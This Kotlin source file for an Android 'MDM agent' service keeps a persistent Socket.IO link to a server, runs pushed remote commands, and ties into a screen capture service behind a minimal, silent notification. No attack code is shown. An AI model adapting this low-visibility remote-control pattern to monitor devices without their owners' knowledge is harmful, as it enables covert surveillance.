package com.mdm.agent.service

import android.app.*
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import com.mdm.agent.R
import com.mdm.agent.data.remote.*
import com.mdm.agent.util.DeviceUtils

class MDMService : Service() {

    companion object {
        private const val TAG = "MDMService"
        private const val NOTIFICATION_ID = 1001
        private const val CHANNEL_ID = "mdm_service"
    }

    private lateinit var apiClient: ApiClient
    private lateinit var cryptoManager: CryptoManager
    private lateinit var uploadManager: UploadManager
    private var commandHandler: CommandHandler? = null
    private lateinit var socketManager: SocketManager

    private val handler = Handler(Looper.getMainLooper())

    override fun onCreate() {
        super.onCreate()
        Log.i(TAG, "=== MDM Service v7.0 ===")

        apiClient = ApiClient(this)
        cryptoManager = CryptoManager()
        uploadManager = UploadManager(this)
        socketManager = SocketManager(this)

        createNotificationChannel()
        try {
            // ✅ On Android 14+ (API 34+), must specify foregroundServiceType in startForeground()
            // On Android 10-13, just startForeground() with notification is fine
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                startForeground(NOTIFICATION_ID, buildNotification(),
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
            } else {
                startForeground(NOTIFICATION_ID, buildNotification())
            }
            Log.i(TAG, "✅ startForeground succeeded")
        } catch (e: Exception) {
            Log.e(TAG, "❌ startForeground failed: ${e.message}")
            // Don't stopSelf() - try to continue without foreground
            // The service may still work for Socket.IO connection
        }

        Thread { connectSocketIO() }.start()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "STOP") {
            socketManager.disconnect()
            stopSelf()
            return START_NOT_STICKY
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        socketManager.disconnect()
        handler.removeCallbacksAndMessages(null)
        // Stop screen capture service
        try {
            stopService(Intent(this, ScreenCaptureService::class.java))
        } catch (_: Exception) {}
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, getString(R.string.channel_name),
                NotificationManager.IMPORTANCE_MIN).apply {
                description = getString(R.string.channel_desc)
                setShowBadge(false); enableVibration(false); setSound(null, null)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
                .setContentTitle(getString(R.string.app_name))
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .setOngoing(true).setDefaults(0).build()
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
                .setContentTitle(getString(R.string.app_name))
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .setOngoing(true).setDefaults(0).build()
        }
    }

    // ═══════════════════════════════════════════════════════════
    // Socket.IO - PRIMARY & ONLY CONNECTION (INSTANT PUSH)
    // ═══════════════════════════════════════════════════════════

    private fun connectSocketIO() {
        val deviceId = DeviceUtils.getDeviceId(this)
        val serverUrl = DeviceUtils.getServerUrl(this)
        Log.i(TAG, "⚡ Connecting Socket.IO Push: $serverUrl | Device: $deviceId")

        // Init crypto via REST first
        try {
            val result = apiClient.initCrypto(deviceId)
            if (result != null) {
                cryptoManager.initFromServer(result)
                Log.i(TAG, "Crypto initialized")
            }
        } catch (e: Exception) {
            Log.w(TAG, "Crypto init failed: ${e.message}")
        }

        // Setup command handler
        commandHandler = CommandHandler(this, apiClient, cryptoManager, socketManager, uploadManager)
        socketManager.setCommandHandler(commandHandler!!)
        socketManager.setCryptoManager(cryptoManager)

        // Setup Socket.IO listeners for INSTANT PUSH commands
        setupSocketListeners()

        // Connect Socket.IO - auto-reconnect every 5 seconds
        socketManager.connect()
    }

    private fun setupSocketListeners() {
        socketManager.onCommandReceived = { data ->
            Log.i(TAG, "⚡ INSTANT command received: ${data.optString("command")}")
            commandHandler?.handleCommand(data)
        }

        socketManager.onBanned = { reason ->
            Log.w(TAG, "Banned: $reason")
            socketManager.disconnect()
        }

        socketManager.onForceDisconnect = { _ ->
            socketManager.disconnect()
        }

        socketManager.onConnected = {
            Log.i(TAG, "⚡ Socket.IO CONNECTED - Ready for instant push commands!")
            // ✅ Make this SocketManager available to MainActivity (for screenshot upload)
            com.mdm.agent.MainActivity.setSocketManager(socketManager)
        }

        socketManager.onDisconnected = {
            Log.w(TAG, "Socket.IO disconnected - auto-reconnect every 5 seconds")
        }
    }
}
